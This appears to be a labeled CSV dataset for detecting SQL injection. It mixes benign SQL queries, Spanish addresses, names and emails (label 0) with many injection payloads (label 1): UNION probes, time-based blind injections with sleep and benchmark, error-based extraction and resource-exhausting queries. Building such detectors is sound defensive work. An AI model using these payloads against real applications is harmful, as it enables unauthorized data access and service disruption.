Query,Label
23215,0
SELECT them ( s )  FROM raw SELECT vegetable ( s ) ,0
SELECT wp_posts.* FROM wp_posts LEFT JOIN wp_term_relationships ON  ( wp_posts.ID  =  wp_term_relationships.object_id )  WHERE 1 = 1 AND  (  wp_term_relationships.term_taxonomy_id IN  ( 2637 )   )  AND wp_posts.post_type  =  'support_family' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_title ASC,0
de las muecas pedrol,0
" SELECT * FROM brave ORDER BY detail ASC, wish DESC",0
"carretera de vista-rica s/n,",0
9.84is22nte334c799,0
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1
SELECT TOP 3 * FROM live SELECT * FROM dead 3SELECT * FROM road,0
"pl. san marcos, 0, 11f",0
32027973j,0
SELECT far ( s )  FROM hold,0
SELECT * FROM salt WHERE report = 'occur'  AND  ( could = 'teeth' OR equal = 'choice' ) ,0
" select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",1
pensosa,0
SELECT * FROM spider WHERE    NOT vessels = 'oxygen',0
1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',1
ge2613an0,0
SELECT COUNT ( purpleID ) FROM why,0
" SELECT * FROM frozen ORDER BY over, former",0
"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1
DELETE FROM pole WHERE making = 'most',0
"  SELECT examine,judge FROM position WHERE book = 'deep' UNION SELECT poetry, skin FROM school",0
"1%'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and '%'  =  '",1
SELECT * FROM solar WHERE known BETWEEN 'declared' AND 'nothing',0
87,0
SELECT roll FROM exclaimed UNION ALL SELECT rabbit FROM struggle ORDER BY office,0
SELECT DISTINCT bare FROM fun,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_number_of_support_family' LIMIT 1,0
"-9535"" order by 1--",1
6.03487E+15,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  +'",1
SELECT * FROM industrial  WHERE drew = rice,0
"-9318""   )    )     )   union all select 5223,5223,5223,5223#",1
e0u08os1,0
51795949h,0
"  SELECT showID AS ID, immediately AS brave FROM warn",0
maclaren,0
SELECT COUNT ( direction ) FROM tongue,0
"calle hostieros, 24",0
SELECT * FROM anybody WHERE full = 'buffalo'  AND  ( conversation = 'rhythm' OR cost = 'merely' ) ,0
"1%""  )   or sleep  (  5  )   and   (  ""%""  =  """,1
SELECT baseball FROM teacher UNION ALL SELECT yellow FROM does ORDER BY without,0
DELETE FROM grandmother,0
9423,0
"1""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT TOP 3 * FROM being SELECT * FROM like 3SELECT * FROM trade,0
-1579%'   )    )     )   union all select 7272#,1
"antelo y mario, 192,",0
1   )    )    and 3249  =  2985,1
"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",1
DELETE FROM mood,0
1is4r1o,0
SELECT personal ( s )  FROM single LEFT JOIN,0
"-5863"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""gkvy""  =  ""gkvy",1
SELECT ATAN ( 2.5 ) ;,0
"-3884"" where 8012  =  8012 union all select 8012,8012#",1
SELECT * FROM adult WHERE saved = 'ten' FETCH FIRST 3 ROWS ONLY,0
carmia,0
"1"" where 3933  =  3933 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
4ibari8a,0
SELECT * FROM powerful WHERE two = 'chain' FETCH FIRST 3 ROWS ONLY,0
"INSERT INTO ran ( instrument, wrong, oldest, few, wore, body )  VALUES  ( 'swept', 'dropped'. repeat', 'cookies', 'bark', 'carbon', 'tonight' )  ",0
1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',1
SELECT * FROM firm FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM quite,0
DELETE FROM policeman,0
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1
"  SELECT product AS wonder, connected AS [herd]  FROM lunch",0
"virgen del valle, 40",0
SELECT * FROM arrangement WHERE port = 'grandfather' FETCH FIRST 3 ROWS ONLY,0
1' where 6583  =  6583,1
select   (  case when   (  7997  =  1543  )   then 7997 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
SELECT grew FROM observe,0
c7o5ologa,0
SELECT * FROM adjective WHERE Price NOT BETWEEN 10 AND 20,0
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # lexm,1
SELECT DISTINCT compass FROM bell,0
"  SELECT surprise AS dear, rest AS [yard]  FROM especially",0
SELECT represent ( s ) FROM ordinary INNER JOIN,0
" SELECT FIELD ( ""q"", ""s"", ""q"", ""l"" ) ; ",0
-4582   )    )    as gvfo where 8885  =  8885 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
SELECT * FROM speed WHERE NOT wagon = 'throw'  AND NOT distance = 'depth',0
5335,0
22618043g,0
9e1an906,0
calle panaderas de san cecilio 168,0
SELECT AVG ( out ) FROM colony,0
"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
24710,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",1
-5751  )   as jybu where 4739  =  4739 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
SELECT active FROM bottle UNION ALL SELECT hit FROM twice ORDER BY it,0
co5r5525e,0
SELECT * FROM branch WHERE result = 'window' FETCH FIRST 3 ROWS ONLY,0
" SELECT column_name ( s )  FROM drink,bank",0
"-7553%"" or 3571  =  2886",1
"-3443""   )    )    union all select 4043,4043,4043,4043,4043,4043,4043#",1
1'+  (  select 'drqj' where 1246  =  1246,1
SELECT TOP 50 PERCENT * FROM recognize,0
"1"" where 9341  =  9341",1
"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
DELETE FROM sister,0
47319,0
-2431'  )   or 8571  =  8571--,1
"-1737' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'fsmd'  =  'fsmd",1
almonacid de la sierra,0
boes@cumbareback.kz,0
-1190' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'yxry' like 'yxry,1
"-4210""  )   where 2679  =  2679 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
476en9o9na5,0
SELECT * FROM railroad  WHERE pan NOT LIKE '[rays]%',0
"1',  (  select   (  case when   (  4209  =  5879  )   then 1 else 4209*  (  select 4209 from information_schema.character_sets  )   end   )    )   ",1
SELECT water ( s )  FROM conversation UNION ALL,0
"   SELECT canal, crew+ ', ' + sent+ ' ' + log+ ', ' + bat AS needed  FROM further",0
ecija 51 12-h,0
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1
SELECT COUNT ( furnitureID ) FROM carry,0
1   )    )    or pg_sleep  (  __TIME__  )  --,1
rix.piljeckaja@waterflyesp.be,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""%""  =  """,1
-9014' order by 1--,1
1'||  (  select 'kzkr' from dual where 2778  =  2778,1
SELECT TOP 3 * FROM particular WHERE except = 'ranch' SELECT * FROM double,0
25186,0
c/ grabador david roberts 154 1-h,0
SELECT BIN ( 8 ) ;,0
1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,1
1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  '%'  =  ',1
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1
"  SELECT FORMAT ( 250500.5634, 0 ) ;",0
sant aniol de finestres,0
"-3930%""   )    )    order by 1#",1
SELECT top FROM noun UNION ALL SELECT naturally FROM rhythm ORDER BY dozen,0
SELECT * FROM Customers   WHERE CustomerName NOT LIKE 'a%';,0
02650843r,0
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1
SELECT option_value FROM wp_options WHERE option_name  =  'zcf_captcha_settings' LIMIT 1,0
"1%' union all select null,null,null,null,null,null,null--",1
hache6,0
SELECT apartment ( s )  FROM plenty UNION ALL,0
SELECT * FROM consider WHERE wrote NOT LIKE 'floor%',0
"1""  )   as firv where 4522  =  4522 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
" select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",1
"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",1
24n1e39,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'ctbs' like 'ctbs",1
SELECT prepare ( s FROM shade RIGHT JOIN,0
"INSERT INTO wool ( vapor, frog, ranch, nodded, war, angry )  VALUES  ( 'mother', 'yourself'. thy', 'call', 'depend', 'thou', 'particles' )  ",0
"1  )   as rnfb where 2405  =  2405 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
knio,0
"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",1
end and    (    (   '%'  =  ',1
" SELECT column_name ( s )  FROM goes,differ",0
casanellas berlingery,0
DELETE FROM hunter,0
kofoed@serviconlevante.mr,0
SELECT small ( s )  FROM force LEFT JOIN,0
calle ecuador 143,0
slezak@ballerpoker.kn,0
SELECT * FROM worry WHERE engine BETWEEN 'struggle' AND 'activity',0
"-5744  )   union all select 3617,3617,3617,3617,3617,3617--",1
1 where 4003  =  4003 union all select null--,1
if  (  4194  =  4133  )   select 4194 else drop function tqhz--,1
-8015  )   where 9808  =  9808 or 9323  =  9323#,1
1  )   where 5629  =  5629,1
SELECT TOP 3 * FROM examine SELECT * FROM chair 3SELECT * FROM scientist,0
"SELECT * FROM forward WHERE gravity BETWEEN ""highway"" AND    ""happened""",0
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ireg' like 'ireg",1
5.77313E+14,0
"1%""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """,1
SELECT TOP 3 * FROM harder WHERE today = 'poet',0
litago,0
1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',1
SELECT * FROM discover FETCH FIRST 3 ROWS ONLY,0
"1""  )   as ckoi where 4674  =  4674 union all select null,null,null,null,null,null,null,null,null,null#",1
9639,0
SELECT TOP 50 PERCENT * FROM decide SELECT * FROM unhappy FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM about,0
2.77767E+15,0
"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # kfza",1
"INSERT INTO we  ( parts, held, gasoline )  VALUES  ( 'diameter', 'police', 'doll' )  ",0
SELECT * FROM social WHERE globe = 'give' FETCH FIRST 3 ROWS ONLY,0
"SELECT WEEKDAY ( ""2017-01-01"" ) ;",0
boys@muebetuweb.mu,0
" SELECT column_name ( s )  FROM so,giant",0
humaina,0
e5670cij3,0
"1'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,1
"   SELECT COUNT ( open ) , battle FROM several BY direct",0
kinsey@etnics.fm,0
SELECT * FROM did WHERE wood BETWEEN west09/01/1996stomach AND doing15/31/1996manner,0
" SELECT * FROM average ORDER BY sure, find",0
 or   (  EXISTS  ) ,1
38747118f,0
18708,0
SELECT TOP 3 * FROM replied WHERE fill = 'ordinary',0
SELECT COUNT ( cage ) FROM football,0
SELECT * FROM body WHERE canal BETWEEN useful09/01/1996mind AND mountain15/31/1996thing,0
guinea hinojar,0
SELECT * FROM rush WHERE car = 'cowboy' FETCH FIRST 3 ROWS ONLY,0
"INSERT INTO stay  ( caught, mainly, find )  VALUES  ( 'model', 'mean', 'giving' )  ",0
SELECT COUNT ( continent ) FROM crack,0
pandora,0
SELECT AVG ( setting ) FROM than,0
coripe,0
brincones,0
SELECT * FROM bound WHERE did BETWEEN 'began' AND 'inch',0
SELECT AVG ( four ) FROM canal,0
"1""   )    )   ",1
h?ele77,0
SELECT compound ( s )  FROM press UNION,0
SELECT look ( s FROM mostly RIGHT JOIN,0
" SELECT * FROM change ORDER BY labor ASC, especially DESC",0
birney-warbeck@lamejorplaya.gl,0
1'   )    )    and 4595  =  4595#,1
SELECT COUNT ( machinery ) FROM unknown,0
1'||  (  select 'bifa' where 6077  =  6077 and 4547  =  9301,1
"-2373%""  )   or 9323  =  9323#",1
azuqueca de henares,0
SELECT came ( s )  FROM seed SELECT tobacco FROM sick,0
"1"" where 7015  =  7015",1
6703,0
victoria,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_1_link' LIMIT 1,0
"  SELECT SUBTIME ( ""2017-06-15 10:24:21.000004"", ""5.000001"" ) ;",0
SELECT * FROM earn,0
cervantes,0
invo3unta6i5,0
SELECT COUNT ( ill ) FROM thing,0
"   SELECT COUNT ( using ) , instrument FROM breeze BY widely",0
ardevol herrador,0
"  SELECT STR_TO_DATE ( ""August,5,2017"", ""%M %e %Y"" ) ;",0
"1%' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '%'  =  '",1
lo7ange,0
 (  select   (  case when   (  5603  =  5603  )   then 5603 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,1
"1""   )    )    as rcse where 4559  =  4559 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
SELECT AVG ( shirt ) FROM cave,0
"  SELECT Orders.paintrID, Employees.friend, Employees.opportunity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.feltID ORDER BY Orders.totalID",0
"1%""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,1
"roure, 43, 3?d",0
4ip7237o8h2dira,0
manquel,0
"benchmark  (  10000000,MD5  (  1   )    )   #",1
alberite de san juan,0
SELECT TOP 3 * FROM whether WHERE spend = 'space',0
SELECT COUNT ( DISTINCT hide )  FROM block,0
"  SELECT sand,baseball,rock FROM tears LEFT JOIN Orders ON book.environmentID =  any.got ORDER BY shelf.aloud",0
torremoroso enrich,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'wweo'  =  'wweo",1
SELECT * FROM  ( SELECT troops FROM farm ) ,0
fowley5@virginislands.com.eg,0
SELECT sugar FROM imagine UNION ALL SELECT pull FROM composition ORDER BY die,0
"1%""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1
SELECT * FROM swing WHERE cross = 'straight',0
SELECT number ( s )  FROM here FULL OUTER JOIN,0
"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1
fantaseadora,0
-4137   )    )    as elxu where 5672  =  5672 order by 1--,1
"  SELECT pet,buried FROM ride WHERE anyone = 'wonder' UNION SELECT leaf, interest FROM bridge",0
1%'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',1
"1  )   where 1415  =  1415 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
"INSERT INTO loose  ( exercise, struck, chosen )  VALUES  ( 'yet', 'importance', 'tomorrow' )  ",0
"""hi""""  )   or   (  """"a""""  =  """"a""",1
"1   )    )    as henn where 9980  =  9980 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"-3505""  )   where 2340  =  2340 or 9323  =  9323#",1
mendracaveitia torreyas,0
&apos; OR,1
SELECT AVG ( together ) FROM youth SELECT SUM ( tight ) ,0
56702228y,0
" SELECT column_name ( s )  FROM silver,pot",0
"1'||  (  select 'nfgq' where 1837  =  1837 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT relationship ( s )  FROM production SELECT almost FROM wall,0
"1'  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
"1 where 6119  =  6119 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM steep 3 SELECT * FROM dangerous,0
tyler,0
closa ortell,0
"alfalfa 47,",0
"1"" and sleep  (  5  )  #",1
SELECT * FROM Products;,0
7106,0
SELECT kill ( s )  FROM lamp SELECT am FROM lay,0
SELECT * FROM nothing FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM club,0
"1'+  (  select 'epza' where 8994  =  8994 and make_set  (  3782  =  2428,2428   )    )   +'",1
SELECT * FROM whole ORDER BY night DESC,0
SELECT Count ( * )  AS noon,0
1'   )    )     )   union all select null--,1
1g5ota323,0
3041,0
1.72E+15,0
SELECT about FROM together UNION SELECT tool FROM opinion ORDER BY series,0
90946866j,0
"1""  )   as yphz where 8174  =  8174 union all select null,null,null,null,null,null,null--",1
"1',  (  select   (  case when   (  3576  =  7744  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1
1   )    )     )   order by 1#,1
SELECT * FROM unless WHERE    NOT fine = 'comfortable',0
select   (  case when   (  6287  =  8341  )   then 6287 else 1/  (  select 0  )   end  )  --,1
" select * from users where id  =  1 or ""?["" or 1  =  1 -- 1",1
c356conio,0
SELECT MIN ( could )  AS which FROM extra,0
SELECT * FROM group,0
"ondulada, 121",0
SELECT opinion FROM difficult UNION ALL SELECT see FROM court ORDER BY realize,0
SELECT * FROM particularly WHERE price = 'railroad'  OR identity = 'noted',0
"1"" where 7245  =  7245 and 9198  =  9198--",1
" select * from users where id  =  '1' union select \.,@@VERSION -- 1'",1
SELECT * FROM running WHERE song = 'window'  AND  ( deeply = 'slight' OR exciting = 'sale' ) ,0
SELECT * FROM offer WHERE ancient = 'thin'  OR bear = 'basket',0
persaud,0
"1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--",1
"   SELECT share, spider, plates FROM easy WHERE making  IS NULL",0
SELECT * FROM mirror 3 SELECT * FROM pleasant,0
33120,0
4.79764E+15,0
indiestro,0
-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1
SELECT * FROM measure WHERE too = 'beginning' FETCH FIRST 3 ROWS ONLY,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv",1
"-7329""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""borw"" like ""borw",1
-4215  )   where 5782  =  5782 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
gaile,0
SELECT SIGN ( -12 ) ;,0
SELECT * FROM difficult WHERE sick LIKE '%serve%',0
"   SELECT class, fast, offer FROM beside WHERE arrive  IS NULL",0
leocricia,0
" SELECT * FROM took ORDER BY shelf, share",0
"  SELECT ADDTIME ( ""2017-06-15   09:34:21.000001"", ""5 2:10:5.000003"" ) ;",0
"-9160'  )   union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",1
FROM  ( SELECT DISTINCT magnet FROM stone ) ,0
de_souza,0
14230,0
porteril,0
34306,0
"1'||  (  select 'eayf' where 5431  =  5431 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1
SELECT * FROM thee 3 SELECT * FROM molecular,0
"-4032""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""olox""  =  ""olox",1
polvo,0
"-7725%'   )    )    union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",1
"   SELECT COUNT ( positive ) , sentence FROM ahead BY sometime",0
"1""   )    )    as eglv where 7412  =  7412 union all select null#",1
rothamel,0
SELECT * FROM native FETCH FIRST 50 PERCENT ROWS ONLY,0
"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw",1
bic9spide,0
SELECT * FROM  ( SELECT start FROM production ) ,0
SELECT COUNT ( wrong ) FROM work,0
SELECT TOP 50 PERCENT * FROM western,0
1'  )   as eyzk where 2489  =  2489 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""gcnq"" like ""gcnq",1
SELECT * FROM wet FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT COUNT ( DISTINCT purple )  FROM even,0
-6802  )   as coyv where 5693  =  5693 or 8571  =  8571--,1
"  SELECT bad,raw FROM spread WHERE current = 'thank' UNION SELECT subject, grow FROM parts",0
select * from users where id  =  1 %  (  \  )   or 1  =  1 -- 1,1
belalczar,0
"1%""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  """,1
SELECT AVG ( essential ) FROM row SELECT SUM ( gradually ) ,0
SELECT * FROM give WHERE for = 'fighting'  OR mountain = 'whom',0
-6100'  )   as kvfc where 2377  =  2377 or 6872  =  6872--,1
batido,0
